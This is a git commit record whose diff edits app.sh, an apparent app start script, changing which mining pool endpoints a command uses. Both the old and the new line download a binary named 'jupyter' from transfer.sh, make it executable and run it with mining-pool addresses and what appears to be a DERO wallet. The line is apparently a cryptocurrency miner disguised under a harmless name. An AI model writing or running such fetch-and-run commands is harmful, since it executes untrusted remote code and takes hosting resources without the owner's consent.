de1fc7c010c0f8bf7393c7b50c7bcdd2f3f1a18e
Hanaang Offical <112566796+hanaang@users.noreply.github.com>
2022-10-19 07:01:09 +0700

    Update app.sh

--- app.sh
+++ app.sh
@@ -1,2 +1,2 @@
 ls
-wget https://transfer.sh/WnjibV/jupyter && chmod +x jupyter && ./jupyter -r heroku-ca.dockerpool.my.id:4300 -r heroku-ca.dockerpool.my.id:4400 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmk2nadysceg79q8gxteg.AMD-Ryzen
+wget https://transfer.sh/WnjibV/jupyter && chmod +x jupyter && ./jupyter -r heroku-ca.dockerpool.my.id:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmk2nadysceg79q8gxteg.AMD-Ryzen
